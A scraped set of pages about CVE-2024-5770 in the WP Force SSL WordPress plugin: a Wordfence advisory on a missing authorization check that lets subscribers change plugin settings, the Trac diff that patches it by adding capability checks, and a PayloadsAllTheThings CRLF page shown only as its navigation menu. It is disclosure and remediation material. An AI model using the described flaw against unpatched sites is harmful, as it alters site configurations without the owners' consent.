=== Content from www.wordfence.com_bef8355a_20250111_160151.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# WP Force SSL & HTTPS SSL Redirect <= 1.66 - Missing Authorization to Settings Update

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   WP Force SSL & HTTPS SSL Redirect <= 1.66 - Missing Authorization to Settings Update

4.2

**Missing Authorization**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L)

| CVE | [CVE-2024-5770](https://www.cve.org/CVERecord?id=CVE-2024-5770) |
| --- | --- |
| CVSS | 4.2 (Medium) |
| Publicly Published | June 7, 2024 |
| Last Updated | June 8, 2024 |
| Researcher | [Foxyyy](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/friderika-baranyai) |

### Description

The WP Force SSL & HTTPS SSL Redirect plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the 'ajax\_save\_setting' function in versions up to, and including, 1.66. This makes it possible for authenticated attackers, subscriber-level permissions and above, to update the plugin settings.

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/wp-force-ssl/tags/1.66/wp-force-ssl.php#L953)
* [swisskyrepo.github.io](https://swisskyrepo.github.io/PayloadsAllTheThings/CRLF%20Injection/)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset/3099110/)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-force-ssl%2Fwp-force-ssl-https-ssl-redirect-166-missing-authorization-to-settings-update&t=WP%20Force%20SSL%20%26%20HTTPS%20SSL%20Redirect%20%3C%3D%201.66%20-%20Missing%20Authorization%20to%20Settings%20Update "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-force-ssl%2Fwp-force-ssl-https-ssl-redirect-166-missing-authorization-to-settings-update&text=WP%20Force%20SSL%20%26%20HTTPS%20SSL%20Redirect%20%3C%3D%201.66%20-%20Missing%20Authorization%20to%20Settings%20Update "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-force-ssl%2Fwp-force-ssl-https-ssl-redirect-166-missing-authorization-to-settings-update "LinkedIn")
Email

## Vulnerability Details for WP Force SSL & HTTPS SSL Redirect

#### [WP Force SSL & HTTPS SSL Redirect](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-force-ssl)

| Software Type | Plugin |
| --- | --- |
| Software Slug | wp-force-ssl [(view on wordpress.org)](https://wordpress.org/plugins/wp-force-ssl) |
| Patched? | Yes |
| Remediation | Update to version 1.67, or a newer patched version |
| Affected Version | * <= 1.66 |
| Patched Version | * 1.67 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from plugins.trac.wordpress.org_26ac9e73_20250111_160149.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F3099110)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Changeset](/changeset/3099109 "Changeset 3099109")
* [Next Changeset](/changeset/3099111 "Changeset 3099111") →

---

# Changeset 3099110

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
06/07/2024 07:18:19 AM
([7 months](/timeline?from=2024-06-07T07%3A18%3A19Z&precision=second "See timeline at 06/07/2024 07:18:19 AM") ago)

Author:
WebFactory
Message:

Security fixes

Location:
[wp-force-ssl/trunk](/browser/wp-force-ssl/trunk?rev=3099110)
Files:

2 edited

* [readme.txt](/browser/wp-force-ssl/trunk/readme.txt?rev=3099110 "Show entry in browser")
  (modified)
  ([2 diffs](#file0 "Show differences"))
* [wp-force-ssl.php](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110 "Show entry in browser")
  (modified)
  ([11 diffs](#file1 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [wp-force-ssl/trunk/readme.txt](/changeset/3099110/wp-force-ssl/trunk/readme.txt "Show the changeset 3099110 restricted to wp-force-ssl/trunk/readme.txt")

  | [r3058608](/browser/wp-force-ssl/trunk/readme.txt?rev=3058608#L1 "Show revision 3058608 of this file in browser") | [r3099110](/browser/wp-force-ssl/trunk/readme.txt?rev=3099110#L1 "Show revision 3099110 of this file in browser") |  |
  | --- | --- | --- |
  | 1 | 1 | === WP Force SSL & HTTPS SSL Redirect === |
  | 2 | 2 | Contributors: WebFactory |
  | 3 |  | Tags: ssl, force ssl, ~~add ssl, install ssl, https, ssl certificate, ssl redirect, mixed content, hsts, lets encrypt, generate ssl certificate~~ |
  |  | 3 | Tags: ssl, force ssl, https, ssl certificate, mixed content |
  | 4 | 4 | Requires at least: 4.6 |
  | 5 | 5 | Tested up to: 6.5 |
  | 6 | 6 | Requires PHP: 5.2 |
  | 7 |  | Stable Tag: 1.6~~6~~ |
  |  | 7 | Stable Tag: 1.67 |
  | 8 | 8 | License: GPLv2 or later |
  | 9 | 9 | License URI: http://www.gnu.org/licenses/gpl-2.0.html |
  | […](/browser/wp-force-ssl/trunk/readme.txt?rev=3058608#L86) | […](/browser/wp-force-ssl/trunk/readme.txt?rev=3099110#L86) |  |
  | 86 | 86 | == Changelog == |
  | 87 | 87 |  |
  |  | 88 | = v1.67 = |
  |  | 89 | - 2024/06/07 |
  |  | 90 | - Security fixes |
  |  | 91 |  |
  | 88 | 92 | = v1.66 = |
  | 89 | 93 | - 2024/03/26 |
* ## [wp-force-ssl/trunk/wp-force-ssl.php](/changeset/3099110/wp-force-ssl/trunk/wp-force-ssl.php "Show the changeset 3099110 restricted to wp-force-ssl/trunk/wp-force-ssl.php")

  | [r3058608](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3058608#L6 "Show revision 3058608 of this file in browser") | [r3099110](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110#L6 "Show revision 3099110 of this file in browser") |  |
  | --- | --- | --- |
  | 6 | 6 | Author: WebFactory Ltd |
  | 7 | 7 | Author URI: https://www.webfactoryltd.com/ |
  | 8 |  | Version: 1.6~~6~~ |
  |  | 8 | Version: 1.67 |
  | 9 | 9 | Text Domain: wp-force-ssl |
  | 10 | 10 | Requires at least: 4.6 |
  | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3058608#L149) | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110#L149) |  |
  | 149 | 149 | check\_ajax\_referer('wpfs\_dismiss\_notice'); |
  | 150 | 150 |  |
  | 151 |  | if (!current\_user\_can('~~administrator~~')) { |
  |  | 151 | if (!current\_user\_can('manage\_options')) { |
  | 152 | 152 | wp\_send\_json\_error('You are not allowed to run this action.'); |
  | 153 | 153 | } |
  | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3058608#L210) | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110#L210) |  |
  | 210 | 210 |  |
  | 211 | 211 | check\_ajax\_referer('run\_tests\_nonce\_action'); |
  | 212 |  | if (!current\_user\_can('administrator')) { |
  |  | 212 |  |
  |  | 213 | if (!current\_user\_can('manage\_options')) { |
  | 213 | 214 | wp\_send\_json\_error('You are not allowed to run this action.'); |
  | 214 | 215 | } |
  | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3058608#L242) | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110#L243) |  |
  | 242 | 243 | $pointers = array(); |
  | 243 | 244 |  |
  | 244 |  | if (!$meta['hide\_welcome\_pointer'] && !$this->is\_plugin\_page() && current\_user\_can('~~administrator~~')) { |
  |  | 245 | if (!$meta['hide\_welcome\_pointer'] && !$this->is\_plugin\_page() && current\_user\_can('manage\_options')) { |
  | 245 | 246 | $pointers['\_nonce\_dismiss\_pointer'] = wp\_create\_nonce('wpfs\_dismiss\_notice'); |
  | 246 | 247 | $pointers['welcome'] = array('target' => '#menu-settings', 'edge' => 'left', 'align' => 'right', 'content' => 'Thank you for installing the <b style="font-weight: 800;">WP Force SSL</b> plugin!<br>Open <a href="' . admin\_url('options-general.php?page=wpfs-settings') . '">Settings - WP Force SSL</a> to access SSL settings.'); |
  | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3058608#L348) | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110#L349) |  |
  | 348 | 349 | if ( |
  | 349 | 350 | 'yes' != $this->options['wpfs\_adminbar\_menu'] || |
  | 350 |  | false === current\_user\_can('~~administrator~~') || |
  |  | 351 | false === current\_user\_can('manage\_options') || |
  | 351 | 352 | false === apply\_filters('wp\_force\_ssl\_show\_admin\_bar', true) |
  | 352 | 353 | ) { |
  | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3058608#L399) | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110#L400) |  |
  | 399 | 400 | function add\_widget() |
  | 400 | 401 | { |
  | 401 |  | if (current\_user\_can('~~administrator~~') && $this->options['wpfs\_dashboard\_widget'] == 'yes') { |
  |  | 402 | if (current\_user\_can('manage\_options') && $this->options['wpfs\_dashboard\_widget'] == 'yes') { |
  | 402 | 403 | add\_meta\_box('wpfssl\_status', 'WP Force SSL Status', array($this, 'widget\_content'), 'dashboard', 'side', 'high'); |
  | 403 | 404 | } |
  | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3058608#L545) | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110#L546) |  |
  | 545 | 546 | { |
  | 546 | 547 | // double check for admin privileges |
  | 547 |  | if (!current\_user\_can('~~administrator~~')) { |
  |  | 548 | if (!current\_user\_can('manage\_options')) { |
  | 548 | 549 | wp\_die('Sorry, you are not allowed to access this page.'); |
  | 549 | 550 | } |
  | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3058608#L820) | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110#L821) |  |
  | 820 | 821 | echo '</table></form>'; |
  | 821 | 822 |  |
  | 822 |  | echo '<p><a href="#" class="button button-primary save-ssl-options">' . \_\_('Save Settings', 'wp-force-ssl') . '</a></p>'; |
  |  | 823 | echo '<p><a href="#" class="button button-primary save-ssl-options">' . esc\_html\_\_('Save Settings', 'wp-force-ssl') . '</a></p>'; |
  | 823 | 824 | } //tab\_settings |
  | 824 | 825 |  |
  | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3058608#L914) | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110#L915) |  |
  | 914 | 915 | public function notice\_min\_wp\_version() |
  | 915 | 916 | { |
  | 916 |  | ~~echo '<div class="error"><p>' . sprintf(\_\_('WP Force SSL plugin <b>requires WordPress version 4.6</b> or higher to function properly. You are using WordPress version %s. Please <a href="%s">update it</a>.', 'wp-force-ssl'), get\_bloginfo('version'), admin\_url('update-core.php')) . '</p></div>'~~; |
  |  | 917 | wpForceSSL\_Utility::wp\_kses\_wf('<div class="error"><p>' . sprintf(\_\_('WP Force SSL plugin <b>requires WordPress version 4.6</b> or higher to function properly. You are using WordPress version %s. Please <a href="%s">update it</a>.', 'wp-force-ssl'), get\_bloginfo('version'), admin\_url('update-core.php')) . '</p></div>'); |
  | 917 | 918 | } // notice\_min\_wp\_version\_error |
  | 918 | 919 |  |
  | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3058608#L954) | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110#L955) |  |
  | 954 | 955 | { |
  | 955 | 956 | check\_ajax\_referer('save\_settting\_nonce\_action'); |
  |  | 957 |  |
  |  | 958 | if (false === current\_user\_can('manage\_options')) { |
  |  | 959 | wp\_die('Sorry, you have to be an admin to run this action.'); |
  |  | 960 | } |
  | 956 | 961 |  |
  | 957 | 962 | $wpfs\_ssl = isset($\_POST['wpfs\_ssl']) ? 'yes' : 'no'; |
  | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3058608#L987) | […](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110#L992) |  |
  | 987 | 992 | check\_ajax\_referer('test\_ssl\_nonce\_action'); |
  | 988 | 993 |  |
  |  | 994 | if (false === current\_user\_can('manage\_options')) { |
  |  | 995 | wp\_die('Sorry, you have to be an admin to run this action.'); |
  |  | 996 | } |
  |  | 997 |  |
  | 989 | 998 | if (isset($\_REQUEST['force']) && (bool)$\_REQUEST['force'] === true) { |
  | 990 | 999 | $nocache = true; |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=3099110)
* [Zip Archive](?format=zip&new=3099110)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from swisskyrepo.github.io_071c9c47_20250111_160150.html ===


[Skip to content](#carriage-return-line-feed)

Payloads All The Things

Carriage Return Line Feed

Initializing search

[GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/ "Go to repository")

Payloads All The Things

[GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/ "Go to repository")

* [Payloads All The Things](..)
* [CONTRIBUTING](../CONTRIBUTING/)
* API Key Leaks

  API Key Leaks
  + [API Key and Token Leaks](../API%20Key%20Leaks/)
  + [IIS Machine Keys](../API%20Key%20Leaks/IIS-Machine-Keys/)
* Account Takeover

  Account Takeover
  + [Account Takeover](../Account%20Takeover/)
  + [MFA Bypasses](../Account%20Takeover/mfa-bypass/)
* Business Logic Errors

  Business Logic Errors
  + [Business Logic Errors](../Business%20Logic%20Errors/)
* CORS Misconfiguration

  CORS Misconfiguration
  + [CORS Misconfiguration](../CORS%20Misconfiguration/)
* CRLF Injection

  CRLF Injection
  + Carriage Return Line Feed

    [Carriage Return Line Feed](./)

    Table of contents
    - [Summary](#summary)
    - [Methodology](#methodology)
      * [Session Fixation](#session-fixation)
      * [Cross Site Scripting](#cross-site-scripting)
      * [Open Redirect](#open-redirect)
    - [Filter Bypass](#filter-bypass)
    - [Labs](#labs)
    - [References](#references)
* CSV Injection

  CSV Injection
  + [CSV Injection](../CSV%20Injection/)
* CVE Exploits

  CVE Exploits
  + [Common Vulnerabilities and Exposures](../CVE%20Exploits/)
  + [CVE-2021-44228 Log4Shell](../CVE%20Exploits/Log4Shell/)
* Clickjacking

  Clickjacking
  + [Clickjacking](../Clickjacking/)
* Client Side Path Traversal

  Client Side Path Traversal
  + [Client Side Path Traversal](../Client%20Side%20Path%20Traversal/)
* Command Injection

  Command Injection
  + [Command Injection](../Command%20Injection/)
* Cross Site Request Forgery

  Cross Site Request Forgery
  + [Cross-Site Request Forgery](../Cross-Site%20Request%20Forgery/)
* DNS Rebinding

  DNS Rebinding
  + [DNS Rebinding](../DNS%20Rebinding/)
* DOM Clobbering

  DOM Clobbering
  + [DOM Clobbering](../DOM%20Clobbering/)
* Denial of Service

  Denial of Service
  + [Denial of Service](../Denial%20of%20Service/)
* Dependency Confusion

  Dependency Confusion
  + [Dependency Confusion](../Dependency%20Confusion/)
* Directory Traversal

  Directory Traversal
  + [Directory Traversal](../Directory%20Traversal/)
* File Inclusion

  File Inclusion
  + [File Inclusion](../File%20Inclusion/)
  + [LFI to RCE](../File%20Inclusion/LFI-to-RCE/)
  + [Inclusion Using Wrappers](../File%20Inclusion/Wrappers/)
* Google Web Toolkit

  Google Web Toolkit
  + [Google Web Toolkit](../Google%20Web%20Toolkit/)
* GraphQL Injection

  GraphQL Injection
  + [GraphQL Injection](../GraphQL%20Injection/)
* HTTP Parameter Pollution

  HTTP Parameter Pollution
  + [HTTP Parameter Pollution](../HTTP%20Parameter%20Pollution/)
* Headless Browser

  Headless Browser
  + [Headless Browser](../Headless%20Browser/)
* Hidden Parameters

  Hidden Parameters
  + [HTTP Hidden Parameters](../Hidden%20Parameters/)
* Insecure Deserialization

  Insecure Deserialization
  + [Insecure Deserialization](../Insecure%20Deserialization/)
  + [.NET Deserialization](../Insecure%20Deserialization/DotNET/)
  + [Java Deserialization](../Insecure%20Deserialization/Java/)
  + [Node Deserialization](../Insecure%20Deserialization/Node/)
  + [PHP Deserialization](../Insecure%20Deserialization/PHP/)
  + [Python Deserialization](../Insecure%20Deserialization/Python/)
  + [Ruby Deserialization](../Insecure%20Deserialization/Ruby/)
* Insecure Direct Object References

  Insecure Direct Object References
  + [Insecure Direct Object References](../Insecure%20Direct%20Object%20References/)
* Insecure Management Interface

  Insecure Management Interface
  + [Insecure Management Interface](../Insecure%20Management%20Interface/)
* Insecure Randomness

  Insecure Randomness
  + [Insecure Randomness](../Insecure%20Randomness/)
* Insecure Source Code Management

  Insecure Source Code Management
  + [Insecure Source Code Management](../Insecure%20Source%20Code%20Management/)
  + [Bazaar](../Insecure%20Source%20Code%20Management/Bazaar/)
  + [Git](../Insecure%20Source%20Code%20Management/Git/)
  + [Mercurial](../Insecure%20Source%20Code%20Management/Mercurial/)
  + [Subversion](../Insecure%20Source%20Code%20Management/Subversion/)
* JSON Web Token

  JSON Web Token
  + [JWT - JSON Web Token](../JSON%20Web%20Token/)
* Java RMI

  Java RMI
  + [Java RMI](../Java%20RMI/)
* LDAP Injection

  LDAP Injection
  + [LDAP Injection](../LDAP%20Injection/)
* LaTeX Injection

  LaTeX Injection
  + [LaTeX Injection](../LaTeX%20Injection/)
* Mass Assignment

  Mass Assignment
  + [Mass Assignment](../Mass%20Assignment/)
* Methodology and Resources

  Methodology and Resources
  + [Active Directory Attacks](../Methodology%20and%20Resources/Active%20Directory%20Attack/)
  + [Bind Shell](../Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/)
  + [Cloud - AWS](../Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/)
  + [Cloud - Azure](../Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/)
  + [Cobalt Strike](../Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/)
  + [Container - Docker](../Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/)
  + [Container - Kubernetes](../Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/)
  + [Application Escape and Breakout](../Methodology%20and%20Resources/Escape%20Breakout/)
  + [HTML Smuggling](../Methodology%20and%20Resources/HTML%20Smuggling/)
  + [Hash Cracking](../Methodology%20and%20Resources/Hash%20Cracking/)
  + [Initial Access](../Methodology%20and%20Resources/Initial%20Access/)
  + [Linux - Evasion](../Methodology%20and%20Resources/Linux%20-%20Evasion/)
  + [Linux - Persistence](../Methodology%20and%20Resources/Linux%20-%20Persistence/)
  + [Linux - Privilege Escalation](../Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/)
  + [MSSQL Server](../Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/)
  + [Metasploit](../Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/)
  + [Bug Hunting Methodology and Enumeration](../Methodology%20and%20Resources/Methodology%20and%20enumeration/)
  + [Network Discovery](../Methodology%20and%20Resources/Network%20Discovery/)
  + [Network Pivoting Techniques](../Methodology%20and%20Resources/Network%20Pivoting%20Techniques/)
  + [Office - Attacks](../Methodology%20and%20Resources/Office%20-%20Attacks/)
  + [Powershell](../Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/)
  + [Reverse Shell Cheat Sheet](../Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)
  + [Source Code Management & CI/CD Compromise](../Methodology%20and%20Resources/Source%20Code%20Management/)
  + [Vulnerability Reports](../Methodology%20and%20Resources/Vulnerability%20Reports/)
  + [Subdomains Enumeration](../Methodology%20and%20Resources/Web%20Attack%20Surface/)
  + [Windows - AMSI Bypass](../Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/)
  + [Windows - DPAPI](../Methodology%20and%20Resources/Windows%20-%20DPAPI/)
  + [Windows - Defenses](../Methodology%20and%20Resources/Windows%20-%20Defenses/)
  + [Windows - Download and execute methods](../Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/)
  + [Windows - Mimikatz](../Methodology%20and%20Resources/Windows%20-%20Mimikatz/)
  + [Windows - Persistence](../Methodology%20and%20Resources/Windows%20-%20Persistence/)
  + [Windows - Privilege Escalation](../Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/)
  + [Windows - Using credentials](../Methodology%20and%20Resources/Windows%20-%20Using%20credentials/)
* NoSQL Injection

  NoSQL Injection
  + [NoSQL Injection](../NoSQL%20Injection/)
* OAuth Misconfiguration

  OAuth Misconfiguration
  + [OAuth Misconfiguration](../OAuth%20Misconfiguration/)
* ORM Leak

  ORM Leak
  + [ORM Leak](../ORM%20Leak/)
* Open Redirect

  Open Redirect
  + [Open URL Redirect](../Open%20Redirect/)
* Prompt Injection

  Prompt Injection
  + [Prompt Injection](../Prompt%20Injection/)
* Prototype Pollution

  Prototype Pollution
  + [Prototype Pollution](../Prototype%20Pollution/)
* Race Condition

  Race Condition
  + [Race Condition](../Race%20Condition/)
* Regular Expression

  Regular Expression
  + [Regular Expression](../Regular%20Expression/)
* Request Smuggling

  Request Smuggling
  + [Request Smuggling](../Request%20Smuggling/)
* SAML Injection

  SAML Injection
  + [SAML Injection](../SAML%20Injection/)
* SQL Injection

  SQL Injection
  + [SQL Injection](../SQL%20Injection/)
  + [Google BigQuery SQL Injection](../SQL%20Injection/BigQuery%20Injection/)
  + [Cassandra Injection](../SQL%20Injection/Cassandra%20Injection/)
  + [DB2 Injection](../SQL%20Injection/DB2%20Injection/)
  + [MSSQL Injection](../SQL%20Injection/MSSQL%20Injection/)
  + [MySQL Injection](../SQL%20Injection/MySQL%20Injection/)
  + [Oracle SQL Injection](../SQL%20Injection/OracleSQL%20Injection/)
  + [PostgreSQL Injection](../SQL%20Injection/PostgreSQL%20Injection/)
  + [SQLite Injection](../SQL%20Injection/SQLite%20Injection/)
  + [SQLmap](../SQL%20Injection/SQLmap/)
* Server Side Include Injection

  Server Side Include Injection
  + [Server Side Include Injection](../Server%20Side%20Include%20Injection/)
* Server Side Request Forgery

  Server Side Request Forgery
  + [Server-Side Request Forgery](../Server%20Side%20Request%20Forgery/)
  + [SSRF Advanced Exploitation](../Server%20Side%20Request%20Forgery/SSRF-Advanced-Exploitation/)
  + [SSRF URL for Cloud Instances](../Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances/)
* Server Side Template Injection

  Server Side Template Injection
  + [Server Side Template Injection](../Server%20Side%20Template%20Injection/)
  + [Server Side Template Injection - ASP.NET](../Server%20Side%20Template%20Injection/ASP/)
  + [Server Side Template Injection - Java](../Server%20Side%20Template%20Injection/Java/)
  + [Server Side Template Injection - JavaScript](../Server%20Side%20Template%20Injection/JavaScript/)
  + [Server Side Template Injection - PHP](../Server%20Side%20Template%20Injection/PHP/)
  + [Server Side Template Injection - Python](../Server%20Side%20Template%20Injection/Python/)
  + [Server Side Template Injection - Ruby](../Server%20Side%20Template%20Injection/Ruby/)
* Tabnabbing

  Tabnabbing
  + [Tabnabbing](../Tabnabbing/)
* Type Juggling

  Type Juggling
  + [Type Juggling](../Type%20Juggling/)
* Upload Insecure Files

  Upload Insecure Files
  + [Upload Insecure Files](../Upload%20Insecure%20Files/)
  + Configuration Apache .htaccess

    Configuration Apache .htaccess
    - [.htaccess](../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/)
* Web Cache Deception

  Web Cache Deception
  + [Web Cache Deception](../Web%20Cache%20Deception/)
* Web Sockets

  Web Sockets
  + [Web Sockets](../Web%20Sockets/)
* XPATH Injection

  XPATH Injection
  + [XPATH Injection](../XPATH%20Injection/)
* XSLT Injection

  XSLT Injection
  + [XSLT Injection](../XSLT%20Injection/)
* XSS Injection

  XSS Injection
  + [Cross Site Scripting](../XSS%20Injection/)
  + [XSS Filter Bypass](../XSS%20Injection/1%20-%20XSS%20Filter%20Bypass/)
  + [Polyglot XSS](../XSS%20Injection/2%20-%20XSS%20Polyglot/)
  + [Common WAF Bypass](../XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass/)
  + [CSP Bypass](../XSS%20Injection/4%20-%20CSP%20Bypass/)
  + [XSS in Angular and AngularJS](../XSS%20Injection/5%20-%20XSS%20in%20Angular/)
* XXE Injection

  XXE Injection
  + [XML External Entity](../XXE%20Injection/)
* Zip Slip

  Zip Slip
  + [Zip Slip](../Zip%20Slip/)
* LEARNING AND SOCIALS

  LEARNING AND SOCIALS
  + [Books](../_LEARNING_AND_SOCIALS/BOOKS/)
  + [Twitter](../_LEARNING_AND_SOCIALS/TWITTER/)
  + [Youtube](../_LEARNING_AND_SOCIALS/YOUTUBE/)
* template vuln

  template vuln
